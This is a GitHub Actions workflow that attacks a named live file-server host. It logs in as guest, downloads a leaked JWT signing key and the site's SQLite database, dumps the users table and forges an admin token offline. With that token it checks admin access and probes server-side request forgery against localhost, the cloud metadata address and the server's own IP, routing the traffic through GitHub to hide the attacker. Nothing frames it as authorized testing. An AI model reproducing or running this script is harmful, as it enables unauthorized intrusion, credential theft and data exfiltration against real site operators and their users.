name: openlist-admin-ssrf
on:
  workflow_dispatch:
jobs:
  admin:
    runs-on: ubuntu-latest
    steps:
      - name: "forge admin JWT via leaked jwt.key, verify admin priv, probe SSRF (GitHub relay, zero own-IP)"
        run: |
          set +e
          B="https://pan.yazinb.icu"
          echo "===== STEP1: re-harvest jwt.key via guest raw_url (confirm leaked key) ====="
          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
          echo "guest_token_len=${#TOKEN}"
          get_raw () { curl -skS -m 30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('raw_url',''))" 2>/dev/null; }
          dl () { curl -skS -m 120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
          P=$(printf '/Artex  %s' " ")
          echo "P=[$P]"
          U=$(get_raw "$P/jwt.key"); dl "$U" /tmp/jwt.key
          echo "jwt.key ascii=[$(cat /tmp/jwt.key)]  sha256=$(sha256sum /tmp/jwt.key|cut -c1-32)"
          U=$(get_raw "$P/data/artex.sqlite"); dl "$U" /tmp/artex.sqlite
          echo "artex.sqlite size=$(wc -c < /tmp/artex.sqlite)"

          echo "===== STEP2: dump users table, find admin username ====="
          CHOSEN=$(python3 -c "
import sqlite3
c=sqlite3.connect('/tmp/artex.sqlite')
tabs=[r[0] for r in c.execute(\"select name from sqlite_master where type='table'\")]
utab=[t for t in tabs if 'user' in t.lower()]
utab=utab[0] if utab else None
print('UTAB',utab,flush=True)
cols=[d[1] for d in c.execute('PRAGMA table_info(%s)'%utab)]
print('COLS',cols,flush=True)
rows=list(c.execute('select * from %s'%utab))
pcol=next((i for i,c in enumerate(cols) if c.lower() in ('permission','is_admin','role')),None)
ucol=next((i for i,c in enumerate(cols) if c.lower() in ('username','user','name')),0)
chosen=None
for r in rows:
    print('ROW',r,flush=True)
    if pcol is not None and str(r[pcol]) in ('1','admin','true','True','root'):
        chosen=r[ucol]; break
if chosen is None and rows: chosen=rows[0][ucol]
print('CHOSEN_ADMIN',chosen,flush=True)
")
          echo "ADMINUSER_from_db=[$CHOSEN]"
          ADMINUSER="${CHOSEN:-admin}"
          if [ -z "$ADMINUSER" ] || [ "$ADMINUSER" = "CHOSEN_ADMIN" ]; then ADMINUSER="admin"; fi
          echo "USING_ADMINUSER=[$ADMINUSER]"

          echo "===== STEP3: forge admin JWT offline with leaked key (HS256) ====="
          ADMINJWT=$(python3 -c "
import hmac,hashlib,base64,json,time,sys
key=open('/tmp/jwt.key','rb').read().strip()
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
usr=sys.argv[1] if len(sys.argv)>1 and sys.argv[1] else 'admin'
now=int(time.time())
hdr={'alg':'HS256','typ':'JWT'}
pld={'exp':now+3600,'iat':now,'nbf':now,'username':usr,'pwd_ts':0}
h=b64u(json.dumps(hdr).encode()); p=b64u(json.dumps(pld).encode())
sig=b64u(hmac.new(key,(h+b'.'+p).encode(),hashlib.sha256).digest())
print(h.decode()+'.'+p.decode()+'.'+sig.decode())
" "$ADMINUSER")
          echo "ADMINJWT_LEN=${#ADMINJWT}"

          echo "===== STEP4: verify admin privilege ====="
          echo "--- /api/me ---"
          curl -skS -m 20 -X GET "$B/api/me" -H "Authorization: $ADMINJWT" -w "\n  HTTP %{http_code}\n" | head -c 600
          echo "--- /api/admin/setting/list (first 400 chars) ---"
          curl -skS -m 20 -X POST "$B/api/admin/setting/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{}' -w "\n  HTTP %{http_code}\n" | head -c 400

          echo "===== STEP5: SSRF probe primitives (admin-only server-side request sinks) ====="
          echo "--- add_offline_download -> 127.0.0.1:80 ---"
          curl -skS -m 30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf_test1","urls":["http://127.0.0.1:80/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "--- add_offline_download -> 169.254.169.254/latest/meta-data/ ---"
          curl -skS -m 30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf_test2","urls":["http://169.254.169.254/latest/meta-data/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "--- add_offline_download -> self 119.28.135.153:443 ---"
          curl -skS -m 30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf_test3","urls":["http://119.28.135.153:443/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "=== ADMIN SSRF PROBE DONE ==="
